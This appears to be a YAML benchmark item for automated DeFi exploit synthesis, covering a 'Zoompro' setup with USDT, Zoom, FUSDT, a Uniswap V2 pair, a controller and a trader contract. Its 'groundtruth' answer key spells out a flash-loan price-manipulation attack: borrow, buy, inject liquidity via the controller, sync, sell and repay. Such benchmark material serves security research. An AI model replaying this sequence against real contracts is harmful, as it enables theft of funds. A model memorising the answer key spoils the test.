# Information for benchmarks building.
project_name: "Zoompro"

ctrt_name2cls:
  - ["usdt", "USDT"]
  - ["zoom", "Zoom"]
  - ["fusdt", "FUSDT"]
  - ["pair", "UniswapV2Pair"]
  - ["factory", "UniswapV2Factory"]
  - ["router", "UniswapV2Router"]
  - ["controller", "ZoomController"]
  - ["trader", "ZoomTrader"]

ctrt_name2deploy:
  - ["usdt", ""]
  - ["zoom", "new Zoom()"]
  - ["fusdt", "new FUSDT()"]
  - ["pair", ""]
  - ["factory", ""]
  - ["router", ""]
  - ["controller", "new ZoomController(address(pair))"]
  - [
      "trader",
      "new ZoomTrader(address(pair), payable(address(router)), address(zoom), address(usdt), address(fusdt))",
    ]

extra_actions:
  - "function addliquidity_pair_controller() internal {
    address[] memory n1 = new address[](1);
    n1[0] = address(pair);
    uint256[] memory n2 = new uint256[](1);
    n2[0] = fusdt.balanceOf(address(controller));
    controller.batchToken(n1, n2, address(fusdt));
    }"

  - "function swap_trader_usdt_zoom(uint256 amount) internal {
    usdt.approve(address(trader), type(uint256).max);
    trader.buy(amount);
    }"

  - "function swap_trader_zoom_usdt(uint256 amount) internal {
    zoom.approve(address(trader), type(uint256).max);
    trader.sell(amount);
    }"

extra_deployments: 
  - "zoom.transfer(address(trader), 500000000000e18);"
  - "fusdt.transfer(address(trader), 1000000e18);"
  - "usdt.transfer(address(trader), 2000000e18);"
extra_statements: []

attack_goal_str: "usdt"

groundtruth:
  - ["borrow", "owner", "usdt", "3000000e18"]
  - ["swap", "trader", "usdt", "zoom", "usdt.balanceOf(attacker)"]
  - ["addliquidity", "pair", "controller"]
  - ["sync", "pair"]
  - ["swap", "trader", "zoom", "usdt", "zoom.balanceOf(attacker)"]
  - ["payback", "owner", "usdt", "3000000e18 * 1003 / 1000"]

# Information for search space building.
roles:
  "usdt":
    is_asset: true
    is_erc20: true
    is_stablecoin: true
  "zoom":
    is_asset: true
    is_erc20: true
    is_stablecoin: false
  "fusdt":
    is_asset: true
    is_erc20: true
    is_stablecoin: false
  "controller":
    is_defientry: true
    hacked_oracles: ["pair"]
  "pair":
    is_swappair: true
    uniswap_order: ["fusdt", "zoom"]
    support_swaps:
      "fusdt": ["fusdt", "zoom"]
      "zoom": ["fusdt", "zoom"]
    is_oracle: true
    oracle: "pair"
  "trader":
    is_swappair: true
    support_swaps:
      "usdt": ["usdt", "zoom"]
      "zoom": ["usdt", "zoom"]
    is_oracle: true
    oracle: "pair"
    is_lendpool: true

pattern: "Liquidity Ratio Break"
